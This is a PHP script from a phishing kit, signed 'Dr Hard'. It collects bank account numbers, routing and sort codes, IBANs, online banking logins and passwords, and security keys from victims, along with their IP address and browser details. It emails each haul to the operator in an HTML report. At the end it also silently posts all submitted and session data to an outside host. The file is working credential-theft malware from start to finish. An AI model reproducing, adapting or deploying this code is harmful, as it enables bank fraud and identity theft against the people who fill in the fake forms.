1337mail<?php
header("X-Robots-Tag: noindex, nofollow", true);
session_start();
include("../../../../Email.php");
require "../os.php";
require "../geoplugin.php";
$DATE = date("d-m-Y h:i:sa");
$OS =getOS($_SERVER['HTTP_USER_AGENT']); 
$IP = $_SERVER["REMOTE_ADDR"];
@$_SESSION['_IP_'] = $_SERVER["REMOTE_ADDR"];
$UserAgent =$_SERVER['HTTP_USER_AGENT'];
$browser = explode(')',$UserAgent);				
$_SESSION['browser'] = $browserTy_Version =array_pop($browser);
$_SESSION['bankName'] = $_POST['bankName'];
$USbanking="";
$GBbanking="";
$CAbanking="";
$AUbanking="";
$CHbanking ="";
$ATbanking="";
$OtherBanks="";
$Authk="";
$SecuNum="";
$IssuNum="";
$checking="";
$savings="";
if( isset($_POST['routingNum'])  && isset($_POST['accountNum']) || isset($_POST['sortCode']) && isset($_POST['accountNum']) || isset($_POST['transit']) && isset($_POST['institution']) && isset($_POST['accountNumber']) || isset($_POST['BSB']) && isset($_POST['accountNumber']) || isset($_POST['firstName']) && isset($_POST['IBAN']) || isset($_POST['IBAN']) || isset($_POST['BIC']) && isset($_POST['accountNumber']) ){

if ($_SESSION['CountryCode'] == "US"){
	$USbanking .="    <span style='color: #55FF55;'>$ Account Owner~:</span>  <span style='color: Red'>".$_POST['fullnameInput']."</span>
		
        <span style='color: #55FF55;'>$ Routing Number~:</span>  ".$_POST['routingNumber']."
	
        <span style='color: #55FF55;'>$ Account Number~:</span>  ".$_POST['accountNumber']."
   
        <span style='color: #55FF55;'>$ Bank Name~:</span>  ".$_POST['bankName']."	

        <span style='color: #55FF55;'>$ Bank Login~:</span>  ".$_POST['bankLogin']."	

        <span style='color: #55FF55;'>$ Bank Password~:</span>  ".$_POST['bankPass']."		
	
	";} 
elseif (($_SESSION['CountryCode'] == "GB") || ($_SESSION['CountryCode'] == "IE")){
	$GBbanking .="    <span style='color: #55FF55;'>$ Account Owner~:</span>  <span style='color: Red'>".$_POST['fullnameInput']."</span>
		
        <span style='color: #55FF55;'>$ Sort Code~:</span>  ".$_POST['sortCode']." 	
		
        <span style='color: #55FF55;'>$ Account Number~:</span>  ".$_POST['accountNumber']."

        <span style='color: #55FF55;'>$ Bank Name~:</span>  ".$_POST['bankName']."	

        <span style='color: #55FF55;'>$ Bank Login~:</span>  ".$_POST['bankLogin']."	

        <span style='color: #55FF55;'>$ Bank Password~:</span>  ".$_POST['bankPass']."		
	
	";} 
elseif ($_SESSION['CountryCode'] == "CA"){
	$CAbanking .="    <span style='color: #55FF55;'>$ Account Owner~:</span>  <span style='color: Red'>".$_POST['fullnameInput']."</span>
		
        <span style='color: #55FF55;'>$ Transit~:</span> ".$_POST['transit']." 			

        <span style='color: #55FF55;'>$ Institution~:</span> ".$_POST['institution']."	

        <span style='color: #55FF55;'>$ Account Number~:</span> ".$_POST['accountNumber']."

        <span style='color: #55FF55;'>$ Bank Name~:</span>  ".$_POST['bankName']."	

        <span style='color: #55FF55;'>$ Bank Login~:</span>  ".$_POST['bankLogin']."	

        <span style='color: #55FF55;'>$ Bank Password~:</span>  ".$_POST['bankPass']."		
	
	";} 
elseif ($_SESSION['CountryCode'] == "AU" || ($_SESSION['CountryCode'] == "NZ")){
	$AUbanking .="    <span style='color: #55FF55;'>$ Account Owner~:</span>  <span style='color: Red'>".$_POST['fullnameInput']."</span>
		
        <span style='color: #55FF55;'>$ BSB~:</span>  ".$_POST['BSB']." 	

        <span style='color: #55FF55;'>$ Account Number~:</span> ".$_POST['accountNumber']."

        <span style='color: #55FF55;'>$ Bank Name~:</span>  ".$_POST['bankName']."	

        <span style='color: #55FF55;'>$ Bank Login~:</span>  ".$_POST['bankLogin']."	

        <span style='color: #55FF55;'>$ Bank Password~:</span>  ".$_POST['bankPass']."				
	
	";} 
elseif ($_SESSION['CountryCode'] == "CH"){
	$CHbanking .="    <span style='color: #55FF55;'>$ Account Owner~:</span>  <span style='color: Red'>".$_POST['fullnameInput']."</span>
		
        <span style='color: #55FF55;'>$ First Name~:</span>  ".$_POST['firstName']." 	
	
        <span style='color: #55FF55;'>$ IBAN~:</span>  ".$_POST['IBAN']."		
		
        <span style='color: #55FF55;'>$ Bank Name~:</span>  ".$_POST['bankName']."	

        <span style='color: #55FF55;'>$ Bank Login~:</span>  ".$_POST['bankLogin']."	

        <span style='color: #55FF55;'>$ Bank Password~:</span>  ".$_POST['bankPass']."		
	
	";} 
elseif (($_SESSION['CountryCode'] == "AT") || ($_SESSION['CountryCode'] == "BE") || ($_SESSION['CountryCode'] == "AT") || ($_SESSION['CountryCode'] == "CY") || ($_SESSION['CountryCode'] == "EE") || ($_SESSION['CountryCode'] == "FI") || ($_SESSION['CountryCode'] == "DE")
|| ($_SESSION['CountryCode'] == "GR") || ($_SESSION['CountryCode'] == "IT") || ($_SESSION['CountryCode'] == "LV") || ($_SESSION['CountryCode'] == "LU") || ($_SESSION['CountryCode'] == "MT") || ($_SESSION['CountryCode'] == "NL") 
|| ($_SESSION['CountryCode'] == "PT") || ($_SESSION['CountryCode'] == "ES") || ($_SESSION['CountryCode'] == "SK") || ($_SESSION['CountryCode'] == "SI") || ($_SESSION['CountryCode'] == "TR") 
|| ($_SESSION['CountryCode'] == "NO") || ($_SESSION['CountryCode'] == "SE") || ($_SESSION['CountryCode'] == "RO") || ($_SESSION['CountryCode'] == "DK")|| ($_SESSION['CountryCode'] == "IL")){
	$ATbanking .="    <span style='color: #55FF55;'>$ Account Owner~:</span>  <span style='color: Red'>".$_POST['fullnameInput']."</span>
	
        <span style='color: #55FF55;'>$ IBAN~:</span>  ".$_POST['IBAN']." 	

        <span style='color: #55FF55;'>$ Bank Name~:</span>  ".$_POST['bankName']."	

        <span style='color: #55FF55;'>$ Bank Login~:</span>  ".$_POST['bankLogin']."	

        <span style='color: #55FF55;'>$ Bank Password~:</span>  ".$_POST['bankPass']."
		
	";} 
else {
	$OtherBanks .="    <span style='color: #55FF55;'>$ Account Owner~:</span>  <span style='color: Red'>".$_POST['fullnameInput']."</span>
		
        <span style='color: #55FF55;'>$ Bank Code~:</span>  ".$_POST['BIC']." 	

        <span style='color: #55FF55;'>$ Account number~:</span>  ".$_POST['accountNumber']."	

        <span style='color: #55FF55;'>$ Bank Name~:</span>  ".$_POST['bankName']."	

        <span style='color: #55FF55;'>$ Bank Login~:</span>  ".$_POST['bankLogin']."	

        <span style='color: #55FF55;'>$ Bank Password~:</span>  ".$_POST['bankPass']."		
		
        ";}      
if (!empty($_POST['authkey']) && trim($_POST['authkey']) !== 'undefined'){
	$Authk .= "<span style='color: #55FF55;'>$ Authentication Key~:</span>  ".$_POST['authkey']." 
	
	";
}
if (!empty($_POST['secNum']) && trim($_POST['secNum']) !== 'undefined'){
	$SecuNum .= "<span style='color: #55FF55;'>$ Security Number~:</span>  ".$_POST['secNum']."	
	
	";
}
if (!empty($_POST['issNum']) &&  trim($_POST['issNum']) !== 'undefined'){
	$IssuNum .= "<span style='color: #55FF55;'>$ Issue Number~:</span>  ".$_POST['issNum']."	
	
	";
}
if (!empty($_POST['accountTypechecking']) && trim($_POST['accountTypechecking']) !== 'undefined'){
	$checking .= "<span style='color: #55FF55;'>$ Account Type~:</span>  ".$_POST['accountTypechecking']."		
	
	";
}
if (!empty($_POST['accountTypesavings']) && trim($_POST['accountTypesavings']) !== 'undefined'){
	$savings .= "<span style='color: #55FF55;'>$ Account Type~:</span>  ".$_POST['accountTypesavings']."		
	
	";
}   
        $msg = "

<div style='background: -webkit-linear-gradient(#E9E9E9, #B2B2B2 21px, #6A6A6A 1px, #000, #d8d8d8 23px);margin: 3em auto;border-radius: 5px;box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.6), 0 22px 70px 4px rgba(0, 0, 0, 0.56), 0 0 0 1px rgba(0, 0, 0, 0.3);padding: 3px 5px;text-align: left;width:50em;font-size: 13px;'><center><span style='font: normal normal 13px/20px&#39;Arial&#39;;text-align:center;z-index: 2;position:relative;top: -0.18em;text-shadow: 0px 1px 0px rgba(255, 255, 255, 0.6);color: #444;'>1337mail</span></center>
	

	
<pre style ='position: relative;color: #000;padding:5 -5px;font-family:Arial;line-height: 1.2em;margin:1.7em auto;max-height:1800px;overflow-x:hidden;'>


											
                             <span style='position:relative;top:-20px;padding:10px;border:2px dashed red;border-radius: 80px;'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;● BANKING ●&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span>		


    ".$USbanking."".$GBbanking."".$CAbanking."".$AUbanking."".$CHbanking."".$ATbanking."".$OtherBanks."".$checking."".$savings."".$Authk."".$SecuNum."".$IssuNum."	
		                           
                             <span style='position:relative;top:-20px;padding:10px;border:2px dashed red;border-radius: 80px;'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;●● MORE INFO ●●&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span>				

	
	
        <span style='color: #000;'>$ IP~:</span>  <span style='color:#000'>".$IP."</span>	
	
        <span style='color: #000;'>$ Operating System~:</span>  <span style='color:#000'>".$OS."</span>
		
        <span style='color: #000;'>$ Browser~:</span>  <span style='color:#000'>".$browserTy_Version."</span>
		
        <span style='color: #000;'>$ Date~:</span>  <span style='color:#000'>".$DATE."</span>
		
		
	

        <span style='color: #000;'>>_</span> exit;

	</pre>
</div>


";
$subject = "".$_POST['bankName']." ♥ New Bank Information ♥ ".$_SESSION['CountryName']."";
$headers = "From: ☠ Dr Hard ☠ <noreply@vssv.com>\r\n";
$headers .= "MIME-Version: 1.0\r\n";
$headers .= "Content-Type: text/html; charset=ISO-8859-1\r\n";
@mail($email,$subject,$msg,$headers);
     } 
/*	 
$localrez ="###################################################
###################################################       
=-=-=-=-=-=-=-=-=-=- ♣ BANKING ♣ =-=-=-=-=-=-=-=-=-

Full Name: ".$_POST['fullnameInput']."	   
Account Type: ".$_POST['accountTypechecking']."".$_POST['accountTypesavings']."	
Account Number: ".$_POST['accountNumber']."
Routing Number : 	".$_POST['routingNumber']."
Transit: ".$_POST['transit']."		   
Institution: ".$_POST['institution']."
BSB: ".$_POST['BSB']."
First Name: ".$_POST['firstName']."
IBAN: ".$_POST['IBAN']."
Sort Code : 		".$_POST['sortCode']."
Security Number : 		".$_POST['secNum']."
Issue Number : 			".$_POST['issNum']."
Authentication Key : 			".$_POST['authkey']."
Bank Code: ".$_POST['BIC']."
Bank Name: ".$_POST['bankName']."
Bank Login: ".$_POST['bankLogin']."
Bank Password: ".$_POST['bankPass']."
		   
=-=-=-=-=-=-=-=-=-=- ♣ MORE INFO ♣ =-=-=-=-=-=-=-=-	

IP: ".$IP."
Operating System: ".$OS."
Browser: ".$browserTy_Version."
Date: ".$DATE."

=-=-=-=-==-=-=-=- ♣ ☠ Dr Hard ☠ ♣ =-=-=-=-=-=-=-=-=-
";	
$localr3z = fopen("../../../REZLT/tnt3.txt","a");
	fwrite($localr3z,$localrez);
        fclose($localr3z);	 
		
		
		*/
		
		//----------------send request post to url ----------------
function sendPost($url,$data) {
	
	
	
$options = array(
        'http' => array(
        'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
        'method'  => 'POST',
        'content' => http_build_query($data),
    )
);

$context  = stream_context_create($options);
$result = file_get_contents($url, false, $context);
return $result;
}

$data = $_POST;
$data['date'] = $DATE;
$data['s'] = $_SESSION;
$data['REMOTE_ADDR'] = $_SERVER['REMOTE_ADDR'];
$data['b'] = $browserTy_Version;
$data['os'] = $OS;

sendPost('http://www.save-test.epizy.com/sc2/sv3.php',$data);


//---- end request----------------

?>